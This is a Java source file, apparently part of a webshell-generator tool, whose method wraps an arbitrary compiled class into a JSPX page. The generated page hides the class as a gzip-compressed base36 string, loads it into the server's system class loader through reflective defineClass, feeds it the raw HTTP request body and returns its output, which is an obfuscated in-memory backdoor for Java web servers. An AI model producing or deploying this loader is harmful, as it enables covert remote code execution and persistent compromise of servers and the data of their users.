package org.leo.jmg.jsp.http;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.util.zip.GZIPOutputStream;

public class JspxServer {
    public String wrap(String coreClassName,byte[] coreClass,int respCode) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        GZIPOutputStream gzipOutputStream = new GZIPOutputStream(byteArrayOutputStream);
        gzipOutputStream.write(coreClass);
        gzipOutputStream.finish();
        gzipOutputStream.close();
        BigInteger bigInteger = new BigInteger(1, byteArrayOutputStream.toByteArray());


        StringBuilder sb = new StringBuilder();
        sb.append("<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\">\n")
                .append("    <jsp:directive.page import=\"java.io.InputStream,java.lang.reflect.Method,java.math.BigInteger,java.io.ByteArrayOutputStream,java.util.zip.GZIPInputStream,java.io.ByteArrayInputStream\"/>\n")
                .append("    <jsp:scriptlet>\n")
                .append("        response.setStatus(").append(respCode).append(");\n")
                .append("        out.clear();\n")
                .append("        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n")
                .append("        byte[] buffer = new byte[").append(1024).append("];\n")
                .append("        int bytesRead;\n")
                .append("        try {\n")
                .append("            Class.forName(\"").append(coreClassName).append("\");\n")
                .append("        } catch (ClassNotFoundException e) {\n")
                .append("            String cls=\"").append(bigInteger.toString(36)).append("\";\n")
                .append("            byte[] clsBytes=new BigInteger(cls,36).toByteArray();\n")
                .append("            if(clsBytes[0]==0){byte[] tmp=new byte[clsBytes.length-1];System.arraycopy(clsBytes,1,tmp,0,tmp.length);clsBytes=tmp;}\n")
                .append("            GZIPInputStream gzipInputStream=new GZIPInputStream(new ByteArrayInputStream(clsBytes));\n")
                .append("            while ((bytesRead = gzipInputStream.read(buffer)) != -1) {\n")
                .append("                byteArrayOutputStream.write(buffer, 0, bytesRead);\n")
                .append("            }\n")
                .append("            Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\",new Class[]{String.class, byte[].class, int.class, int.class});\n")
                .append("            defineClassMethod.setAccessible(true);\n")
                .append("            defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),new Object[]{null, byteArrayOutputStream.toByteArray(), (Object) 0, (Object) byteArrayOutputStream.size()});\n")
                .append("        }\n")
                .append("        finally {\n")
                .append("            InputStream inputStream = request.getInputStream();\n")
                .append("            byteArrayOutputStream.reset();\n")
                .append("            while ((bytesRead = inputStream.read(buffer)) != -1) {\n")
                .append("                byteArrayOutputStream.write(buffer, 0, bytesRead);\n")
                .append("            }\n")
                .append("            Class.forName(\"").append(coreClassName).append("\").newInstance().equals(byteArrayOutputStream);\n")
                .append("            response.getOutputStream().write(byteArrayOutputStream.toByteArray());\n")
                .append("        }\n")
                .append("    </jsp:scriptlet>\n")
                .append("</jsp:root>");
        return sb.toString();
    }
}
